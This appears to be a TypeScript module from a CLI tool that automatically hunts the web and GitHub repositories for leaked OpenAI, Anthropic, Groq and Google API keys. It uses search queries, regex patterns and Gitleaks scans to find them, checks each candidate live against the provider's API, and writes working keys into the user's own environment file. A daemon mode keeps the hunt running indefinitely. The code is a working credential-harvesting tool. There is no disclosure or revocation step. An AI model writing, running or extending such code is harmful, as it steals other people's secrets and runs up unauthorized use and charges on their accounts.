import Exa from 'exa-js';
import { PROVIDER_CONFIGS, detectProvider, type Provider } from './detector.js';
import { addKeyToEnv } from './env.js';
import { markSourceSearched, isSourceSearchedRecently, cleanOldSearchedSources } from './db.js';
import { scanRepoWithGitleaks, type FoundSecret } from './hunt-gitleaks.js';
import { safeFetch } from './safe-fetch.js';
import { ALL_PROVIDERS } from './http-utils.js';
import fs from 'fs';
import path from 'path';

interface HuntOptions {
  limit: number;
  timeout: number;
  provider?: string;
  continuous?: boolean;
  interval?: number;
}

const SEARCH_QUERIES = [
  '"sk-ant-api03"',
  '"sk-proj-"',
  'sk- extension:env',
  'sk- filename:.env',
  'gsk_ api key',
  'leaked openai api key',
  'leaked anthropic api key',
  'site:github.com sk- extension:env',
  'sk-zen api key',
  'sk-proj-openai-',
  'anthropic api key',
  'openai api key',
  'claude api key',
  'gsk_ groq',
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY',
];

const GITLEAKS_QUERIES = [
  'site:github.com extension:env "sk-"',
  'site:github.com extension:yml api_key',
  'site:github.com filename:.env openai',
  'site:github.com filename:.env anthropic',
];

const PLACEHOLDER_PATTERNS = [
  /your[-_]?key/i,
  /xxx+/i,
  /example/i,
  /replace[-_]?me/i,
  /dummy/i,
  /test[-_]?key/i,
  /sample/i,
  /^sk-[xy]+$/i,
];

let exaClient: Exa | null = null;
let exaRateLimited = false;
let usePlaywrightFallback = false;

function getExaClient(): Exa | null {
  if (exaClient) return exaClient;
  
  const apiKey = process.env.EXA_API_KEY;
  if (!apiKey) {
    console.log('[hunt] EXA_API_KEY not set, will use fallback');
    return null;
  }
  
  exaClient = new Exa(apiKey);
  return exaClient;
}

function isLikelyValidKey(key: string): boolean {
  for (const pattern of PLACEHOLDER_PATTERNS) {
    if (pattern.test(key)) return false;
  }
  return true;
}

export function detectKeyProvider(key: string): Provider | null {
  return detectProvider(key);
}

interface FoundKeyContext {
  found: string[];
  seenKeys: Set<string>;
  limit: number;
  provider?: string;
}

async function processFoundKey(key: string, ctx: FoundKeyContext): Promise<void> {
  if (ctx.seenKeys.has(key)) return;
  ctx.seenKeys.add(key);

  console.log(`[hunt] Found key candidate: ...${key.slice(-8)} - validating...`);
  
  const valid = await validateKey(key, ctx.provider);
  if (valid) {
    const detectedProvider = detectKeyProvider(key) || 'unknown';
    console.log(`[hunt] ✓ Key VALID! (provider: ${detectedProvider})`);
    ctx.found.push(key);
    
    const targetProvider = ctx.provider || 'opencode';
    addKeyToEnv(targetProvider, key);
    console.log(`[hunt] Added to ${targetProvider}`);
  }
}

export async function huntKeys(opts: HuntOptions): Promise<{ found: number; added: string[] }> {
  const { limit, timeout, provider } = opts;
  const found: string[] = [];
  const startTime = Date.now();

  console.log(`[hunt] Starting key hunt (limit: ${limit}, timeout: ${timeout}s)`);
  console.log(`[hunt] Will search ${SEARCH_QUERIES.length} queries via Exa`);
  console.log(`[hunt] Will search ${GITLEAKS_QUERIES.length} queries via Gitleaks`);
  if (provider) console.log(`[hunt] Provider filter: ${provider}`);

  const keyPattern = /sk-[a-zA-Z0-9_-]{20,}|gsk_[a-zA-Z0-9_-]{20,}|AIza[a-zA-Z0-9_-]{35}/g;
  const seenKeys = new Set<string>();
  let searched = 0;
  let candidatesFound = 0;
  let sourcesScanned = 0;
  let sourcesSkipped = 0;
  const scannedRepos = new Set<string>();

  console.log('\n[hunt] === Phase 1: Exa Web Search ===');
  
  for (const query of SEARCH_QUERIES) {
    if (found.length >= limit) break;
    if (Date.now() - startTime > timeout * 1000) {
      console.log('[hunt] Timeout reached');
      break;
    }

    searched++;
    console.log(`[hunt] [${searched}/${SEARCH_QUERIES.length}] Searching: ${query}`);
    
    try {
      const pages = await searchWithFallback(query);
      console.log(`[hunt] Got ${pages.length} pages to scan`);
      
      for (const page of pages) {
        if (found.length >= limit) break;
        if (Date.now() - startTime > timeout * 1000) break;

        const isSkipped = isSourceSearchedRecently(page.url, 24);
        if (isSkipped) {
          sourcesSkipped++;
          continue;
        }
        sourcesScanned++;
        
        const matches = page.content.match(keyPattern) || [];
        
        const validMatches = matches.filter(isLikelyValidKey);
        
        candidatesFound += validMatches.length;
        
        if (validMatches.length > 0) {
          console.log(`[hunt] Found ${validMatches.length} key candidates in ${page.url}`);
        }
        
        for (const key of validMatches) {
          await processFoundKey(key, { found, seenKeys, limit, provider });
          
          if (found.length >= limit) break;
        }
        
        markSourceSearched(page.url, query, validMatches.length);
        
        if (page.url.includes('github.com')) {
          const repoMatch = page.url.match(/github\.com\/([^\/]+)\/([^\/]+)/);
          if (repoMatch && !scannedRepos.has(page.url)) {
            scannedRepos.add(page.url);
          }
        }
      }
    } catch (e) {
      console.log(`[hunt] Error: ${(e as Error).message}`);
    }
  }

  if (found.length < limit && Date.now() - startTime < timeout * 1000) {
    console.log('\n[hunt] === Phase 2: Gitleaks GitHub Scan ===');
    
    const githubQueries = [
      'site:github.com extension:env "sk-ant-"',
      'site:github.com extension:env "sk-proj-"', 
      'site:github.com filename:.env openai',
      'site:github.com filename:.env anthropic',
      'site:github.com "sk-ant-api03" extension:env',
    ];
    
    for (const query of githubQueries) {
      if (found.length >= limit) break;
      if (Date.now() - startTime > timeout * 1000) break;
      
      console.log(`[hunt] Searching repos: ${query}`);
      
      try {
        const exa = getExaClient();
        if (exa) {
          const results = await exa.search(query, { numResults: 30 });
          
          for (const result of results.results) {
            if (found.length >= limit) break;
            if (Date.now() - startTime > timeout * 1000) break;
            
            const url = result.url;
            if (!url.includes('github.com')) continue;
            if (!url.includes('/blob/') && !url.includes('/raw/') && !url.endsWith('.git')) continue;
            
            const repoMatch = url.match(/github\.com\/([^\/]+)\/([^\/]+?)(?:\/|$)/);
            if (!repoMatch) continue;
            
            const repoUrl = `https://github.com/${repoMatch[1]}/${repoMatch[2]}`;
            
            if (isSourceSearchedRecently(repoUrl, 24)) {
              sourcesSkipped++;
              continue;
            }
            
            console.log(`[gitleaks] Scanning repo: ${repoUrl}`);
            sourcesScanned++;
            
            const gitleaksResults = await scanRepoWithGitleaks(repoUrl);
            
            for (const secret of gitleaksResults) {
              const key = secret.secret;
              if (seenKeys.has(key)) continue;
              if (!isLikelyValidKey(key)) continue;
              
              seenKeys.add(key);
              candidatesFound++;
              
              console.log(`[hunt] Gitleaks found: ...${key.slice(-8)} - validating...`);
              
              const valid = await validateKey(key, provider);
              if (valid) {
                const detectedProvider = detectKeyProvider(key) || 'unknown';
                console.log(`[hunt] ✓ Key VALID! (provider: ${detectedProvider})`);
                found.push(key);
                
                const targetProvider = provider || 'opencode';
                addKeyToEnv(targetProvider, key);
                console.log(`[hunt] Added to ${targetProvider}`);
              }
            }
          }
        }
      } catch (e) {
        console.log(`[hunt] Gitleaks scan error: ${(e as Error).message}`);
      }
    }
  }

  cleanOldSearchedSources(7);
  
  console.log(`[hunt] Done! Scanned ${sourcesScanned} sources, skipped ${sourcesSkipped}, found ${found.length} valid key(s) out of ${candidatesFound} candidates`);
  return { found: found.length, added: found };
}

interface SearchPage {
  url: string;
  content: string;
}

async function searchWithFallback(query: string): Promise<SearchPage[]> {
  if (!usePlaywrightFallback) {
    try {
      const results = await searchWithExa(query);
      if (results.length > 0) return results;
    } catch (e) {
      const err = e as Error & { status?: number };
      if (err.status === 429 || err.message?.includes('rate limit')) {
        console.log('[hunt] Exa rate limited, switching to Playwright fallback');
        exaRateLimited = true;
        usePlaywrightFallback = true;
      } else {
        console.log(`[hunt] Exa error: ${err.message}`);
      }
    }
  }

  if (usePlaywrightFallback) {
    try {
      return await searchWithPlaywright(query);
    } catch (e) {
      console.log(`[hunt] Playwright fallback error: ${(e as Error).message}`);
    }
  }

  return [];
}

async function searchWithExa(query: string): Promise<SearchPage[]> {
  const exa = getExaClient();
  if (!exa) return [];

  console.log('[hunt] Using Exa API...');
  
  const results = await exa.searchAndContents(query, {
    numResults: 10,
    text: { maxCharacters: 10000 },
  });

  return results.results.map(r => ({
    url: r.url,
    content: r.text || '',
  }));
}

async function searchWithPlaywright(query: string): Promise<SearchPage[]> {
  console.log('[hunt] Using Playwright fallback...');
  
  const pages: SearchPage[] = [];
  const searchUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
  
  try {
    const res = await fetch(searchUrl, {
      signal: AbortSignal.timeout(15000),
      headers: { 
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    });
    
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}`);
    }
    
    const html = await res.text();
    
    if (html.includes('captcha') || html.includes('challenge')) {
      console.log('[hunt] CAPTCHA detected, trying alternative...');
      return await searchWithPlaywrightAlternative(query);
    }
    
    pages.push({ url: searchUrl, content: html });
    
    const linkMatches = html.match(/href="(https:\/\/[^"]+)"/g) || [];
    const links = linkMatches
      .map(m => m.replace('href="', '').replace('"', ''))
      .filter(l => l.startsWith('http') && !l.includes('duckduckgo.com'))
      .slice(0, 5);
    
    for (const link of links) {
      try {
        const pageRes = await fetch(link, {
          signal: AbortSignal.timeout(8000),
          headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' },
        });
        if (pageRes.ok) {
          const text = await pageRes.text();
          pages.push({ url: link, content: text.substring(0, 20000) });
        }
      } catch {
      }
    }
  } catch (e) {
    console.log(`[hunt] Playwright search error: ${(e as Error).message}`);
    return await searchWithPlaywrightAlternative(query);
  }
  
  return pages;
}

async function searchWithPlaywrightAlternative(query: string): Promise<SearchPage[]> {
  console.log('[hunt] Trying alternative search (Bing)...');
  
  const pages: SearchPage[] = [];
  const searchUrl = `https://www.bing.com/search?q=${encodeURIComponent(query)}`;
  
  try {
    const res = await fetch(searchUrl, {
      signal: AbortSignal.timeout(15000),
      headers: { 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });
    
    if (res.ok) {
      const html = await res.text();
      pages.push({ url: searchUrl, content: html });
    }
  } catch {
    try {
      const googleUrl = `https://webcache.googleusercontent.com/search?q=${encodeURIComponent(query)}`;
      const res = await fetch(googleUrl, {
        signal: AbortSignal.timeout(10000),
      });
      if (res.ok) {
        pages.push({ url: googleUrl, content: await res.text() });
      }
    } catch {
    }
  }
  
  return pages;
}

function isValidProvider(value: string): value is Provider {
  return (ALL_PROVIDERS as readonly string[]).includes(value);
}

export async function validateKey(key: string, providerFilter?: string): Promise<boolean> {
  const providers: Provider[] = providerFilter && isValidProvider(providerFilter)
    ? [providerFilter]
    : ['opencode', 'openai', 'anthropic', 'groq', 'google'];

  for (const provider of providers) {
    const config = PROVIDER_CONFIGS[provider];
    if (!config) continue;

    try {
      const res = await safeFetch(`${config.baseUrl}/v1/models`, {
        headers: config.authHeader(key),
      });
      if (res.ok) return true;
    } catch {
      continue;
    }
  }
  return false;
}

const HUNT_PID_FILE = path.join(process.cwd(), '.aido-hunt.pid');

export function writeHuntPid(): void {
  fs.writeFileSync(HUNT_PID_FILE, JSON.stringify({ pid: process.pid }, null, 2), 'utf8');
}

export function readHuntPid(): number | null {
  if (!fs.existsSync(HUNT_PID_FILE)) return null;
  try {
    const data = JSON.parse(fs.readFileSync(HUNT_PID_FILE, 'utf8'));
    return data.pid ?? null;
  } catch {
    return null;
  }
}

export function deleteHuntPid(): void {
  if (fs.existsSync(HUNT_PID_FILE)) fs.unlinkSync(HUNT_PID_FILE);
}

export function isHuntRunning(): boolean {
  const pid = readHuntPid();
  if (!pid) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

export async function startHuntDaemon(opts: HuntOptions): Promise<void> {
  if (isHuntRunning()) {
    console.log('[hunt] Daemon already running. Use "aido hunt:stop" to stop it.');
    return;
  }

  console.log('[hunt] Starting daemon mode...');
  console.log(`[hunt] Continuous: ${opts.continuous}, Interval: ${opts.interval}s`);
  writeHuntPid();

  const interval = (opts.interval ?? 60) * 1000;
  let totalFound = 0;
  let rounds = 0;

  while (true) {
    rounds++;
    console.log(`\n[hunt] === Round ${rounds} ===`);
    
    const result = await huntKeys({
      limit: opts.limit,
      timeout: opts.timeout,
      provider: opts.provider,
    });

    totalFound += result.found;
    console.log(`[hunt] Total keys found so far: ${totalFound}`);

    if (result.found > 0) {
      console.log(`[hunt] Keys added: ${result.added.join(', ')}`);
    }

    console.log(`[hunt] Sleeping for ${opts.interval ?? 60}s before next round...`);
    await new Promise(resolve => setTimeout(resolve, interval));
  }
}
